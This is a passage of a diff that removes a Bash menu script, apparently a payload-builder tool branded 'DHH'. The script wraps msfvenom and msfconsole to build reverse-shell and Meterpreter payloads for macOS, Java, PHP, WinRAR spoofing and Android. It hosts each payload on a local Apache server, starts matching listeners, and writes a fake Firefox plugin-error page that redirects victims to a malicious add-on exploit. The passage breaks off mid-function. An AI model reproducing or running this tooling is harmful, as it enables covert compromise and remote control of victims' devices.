-echo "============================================="$BLUE
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [macho] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED osx/x86/shell_reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p osx/x86/shell_reverse_tcp LHOST=$host LPORT=$port -a x86 --platform OSX -f macho > $hh/Desktop/Output/$name"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name
-cp $name /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listener " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD osx/x86/shell_reverse_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-
-
-
-java () {
-clear
-
-cat << !
-
-$RED
-
-┌┬┐┬ ┬┬ ┌┬┐┬ ┬  ┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐
-││││ ││  │ │ │  ├┤ ┌┴┬┘├─┘│  │ ││ │ 
-┴ ┴└─┘┴─┘┴ └─┘  └─┘┴ └─┴  ┴─┘└─┘┴ ┴$GREEN
- 
-!
-echo "============================================="$BLUE
-echo
-echo "please wait.........."
-sleep 2
-clear
-echo
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo
-echo -n "Enter LHOST=$RED"
-read LHOST
-echo "" $GREEN
-sleep 1
-echo "LHOST==>$BLUE $LHOST "$GREEN
-echo
-echo "==========================="
-echo
-echo -n "Enter LPORT=$RED "
-read port
-echo "" $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port "$GREEN
-echo
-echo "==========================="
-echo
-echo -n "Enter URIPATH=$RED"
-read URIPATH
-echo "" $GREEN
-sleep 1
-echo "URIPATH==>$BLUE $URIPATH"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for pyload=$RED"
-read name
-echo "" $GREEN
-sleep 1
-echo "NAME=>>$BLUE $name "$GREEN
-echo
-echo "============================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [jar] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $LHOST $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"  
-echo "$BLUE PAYLOAD    $GREEN:>$RED multi/browser/java_signed_applet $GREEN"
-echo "$BLUE URIPATH    $GREEN:>$RED $URIPATH $GREEN "
-echo "$BLUE SAVE IN    $GREEN:>$RED $hh/Desktop/Output/$name and /var/www/html/$name"
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo ""$GREEN
-echo
-echo "Output Fonud "
-echo
-echo
-echo
-echo
-else
-mkdir Output
-fi
-cd ..
-sleep 1
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-javaa=.jar
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p java/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$port R > $hh/Desktop/Output/$name$javaa"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$javaa
-cp $name$javaa /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - Create Listener  on [ $GREEN $name ]"$BLUE
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting listener on $BLUE[$name]"
-sleep 1
-xterm -T "DHH - listener on [$name] " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/java_signed_applet; set LHOST $LHOST; set SRVHOST $LHOST; set URIPATH $URIPATH; set LPORT $port; set PAYLOAD java/meterpreter/reverse_tcp; set target 0; exploit -j'"
-
-elif [ $choice = 2 ];then
-clear
-fi
-
-
-}
-
-
-web () {
-clear
-
-cat << !
-
-$RED
-
-┬ ┬┌─┐┌┐ ┌─┐┬ ┬┌─┐  ┌─┐┌─┐┬ ┬┬  ┌─┐┌─┐┌┬┐  
-│││├┤ ├┴┐├─┘├─┤├─┘  ├─┘├─┤└┬┘│  │ │├─┤ ││  
-└┴┘└─┘└─┘┴  ┴ ┴┴    ┴  ┴ ┴ ┴ ┴─┘└─┘┴ ┴─┴┘$GREEN  
-
-!
-echo "============================================="$BLUE
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip ]           "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2 ]         "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [php] Final Config:      "
-echo "=================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED php/meterpreter/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-dds=.php
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f raw > $hh/Desktop/Output/$name$dds"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$dds
-cp $name$dds /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [ $GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listener " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD php/meterpreter/reverse_tcp; exploit -j'"
-
-elif [ $choice = 2 ];then
-clear
-fi
-
-
-}
-
-wiri () {
-clear
-
-cat << !
-
-$RED
-
-                                                                                        
-                                                                  
- _ _ _ _                    _____         _     _                 
-| | | |_|___ ___ ___ ___   | __  |___ ___| |_ _| |___ ___ ___     
-| | | | |   |  _| .'|  _|  | __ -| .'|  _| '_| . | . | . |  _|    
-|_____|_|_|_|_| |__,|_|    |_____|__,|___|_,_|___|___|___|_|      
-                                                             $GREEN     
-!
-echo "==================================================================="$BLUE
-echo
-echo "please wait........."
-sleep 3 
-clear
-echo ""
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter your zip name=$RED"
-read name
-fainalnem=$name > /dev/null 2>&1
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter Spoof file=$RED"
-read spooff
-echo "" $GREEN
-sleep 1
-echo "spoof file==>$BLUE $spooff "$GREEN
-echo
-sleep 2
-clear
-echo    
-echo                                                                                       
-echo " Final [Win backdoor] Config:      " 
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"  
-echo "$BLUE SpoofFile  $GREEN:>$RED $spooff $GREEN"
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/fileformat/winrar_name_spoofing $GREEN"
-echo "$BLUE SAVE IN    $GREEN:>$RED $hh/Desktop/Output/$name and /var/www/html/$name $GREEN"
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Output fonud "
-echo
-echo
-else
-mkdir Output
-fi
-cd ..
-sleep 1
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create: $name" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/windows/fileformat/winrar_name_spoofing; set LHOST $host; set SPOOF $spooff; set TARGET 0; exploit -j'"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/.msf4/local
-      chmod +x msf.zip && mv msf.zip $name
-      cp $name /var/www/html && cp $name $hh/Desktop/Output/ 
-cd ..
-echo $BLUE"[*]$RED:$GREEN Done! "
-echo
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [ $GREEN $name ]"$BLUE
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting listener on $BLUE[$name]"
-sleep 1
-xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set PAYLOAD windows/meterpreter/reverse_tcp; exploit -j'"
-
-elif [ $choice = 2 ];then
-clear
-fi
-
-
-}
-
-fireadd () {
-clear
-echo
-
-cat << !
-
-
-$RED
- _______ __              ___                            __     __ __ __   __              
-|    ___|__|.----.-----.'  _|.-----.--.--.    .---.-.--|  |.--|  |__|  |_|__|.-----.-----.
-|    ___|  ||   _|  -__|   _||  _  |_   _|    |  _  |  _  ||  _  |  |   _|  ||  _  |     |
-|___|   |__||__| |_____|__|  |_____|__.__|    |___._|_____||_____|__|____|__||_____|__|__| $GREEN
-                                                                                          
-
-!
-echo "==========================================================================================="$BLUE
-echo
-echo "Please wait........"
-sleep 3
-clear
-echo ""
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter SRVHOST=$RED"
-read SRVHOST
-echo ""$GREEN
-sleep 1
-echo "SRVHOST==>$BLUE $SRVHOST "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter SRVPORT=$RED"
-read SRVPORT
-echo $GREEN
-sleep 1
-echo "SRVPORT==>$BLUE $SRVPORT "$GREEN
-echo
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter NAME For Fake Addition=$RED"
-read addition
-echo "" $GREEN
-sleep 1
-echo "Fake Addition NAME==>$BLUE $addition "$GREEN
-echo
-echo
-echo
-echo "=============================="
-sleep 1
-echo
-echo -n "Enter URIPATH=$RED"
-read URIPATH
-echo "" $GREEN
-sleep 1
-echo "URIPATH==>$BLUE $URIPATH "$GREEN
-echo
-echo "=============================="
-sleep 1
-echo -n "Enter HTML TITLE=$RED"
-read htmlti
-echo "" $GREEN
-sleep 1
-echo "HTML TITLE==>$BLUE $htmlti "$GREEN
-sleep 2
-clear
-echo    
-echo                                                                                       
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Output Found"
-echo
-echo
-else
-mkdir Output
-fi
-cd $hh/Desktop/Output/
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE index.html $RED] "
-
-         echo "<html><head></head><body>" > index.html
-         echo "<title>$addition:$htmlti</title><br /><br />" >> index.html
-         echo "<center><b>ERROR:404:FIREFOX:MISSING:PLUGIN:$addition!</b></center>" >> index.html
-         echo "<link rel="shortcut icon" type="image/x-icon" a href="https://addons.cdn.mozilla.net/media/img/favicon.ico">" >> index.html
-         echo "<meta http-equiv='refresh' content='5; url=http://$SRVHOST:$SRVPORT$URIPATH' />" >> index.html
-         echo "</body></html>" >> index.html
-cd ..
-sleep 3
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 3
-clear
-echo
-echo
-echo ""$GREEN
-echo " [Facke Add] Final Config: "
-echo "==============================================="
-echo "$BLUE SRVHOST            $GREEN:>$RED $SRVHOST $GREEN"
-echo "$BLUE SRVPORT            $GREEN:>$RED $SRVPORT $GREEN"
-echo "$BLUE Fake-Add-NAME      $GREEN:>$RED $addition $GREEN"
-echo "$BLUE HTML-TITLE         $GREEN:>$RED $htmlti $GREEN"
-echo "$BLUE SAVE IN            $GREEN:>$RED $hh/Desktop/Output/index.html and /var/www/html/index.html $GREEN"
-sleep 3
-echo
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-apa=/var/www/html
-cd $hh/Desktop/Output
-cp index.html $apa/index.html
-sleep 1
-echo $BLUE"[*]$RED:$GREEN Done! "
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 1
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo
-echo "$RED Done Fake Firefox addition has been Created in$GREEN ->>>$BLUE[ $apa/index.html and /root/Desktop/Output/index.html ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [ $GREEN $addition $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting listener on $BLUE[$addition]"
-sleep 2
-xterm -T "DHH - listener on [ $addition ]" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/browser/firefox_xpi_bootstrapped_addon; set TARGET 1; set ADDONNAME $addition; set SRVHOST $SRVHOST; set URIPATH $URIPATH; set AutoUninstall 1; set SRVPORT $SRVPORT; exploit -j'"
-
-elif [ $choice = 2 ];then
-clear
-fi
-
-}
-
-and1 () {
-clear
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [APK] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED android/meterpreter/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-aa=.apk
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_tcp  LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$aa
-cp $name$aa /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
- xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/meterpreter/reverse_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-
-and2 () {
-clear
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [APK] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED android/meterpreter/reverse_http $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-aa=.apk
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_http LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$aa
-cp $name$aa /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
- xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/meterpreter/reverse_http; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-and3 () {
-clear
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [APK] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                          
-echo "$BLUE PAYLOAD    $GREEN:>$RED android/meterpreter/reverse_https $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-aa=.apk
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 110x23 -e "msfvenom -p android/meterpreter/reverse_https LHOST=$host LPORT=$port -a dalvik --platform Android -f raw > $hh/Desktop/Output/$name$aa"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$aa
-cp $name$aa /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
- xterm -T "DHH - [$name] Listener" -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD android/meterpreter/reverse_https; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-and1s () {
-clear
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
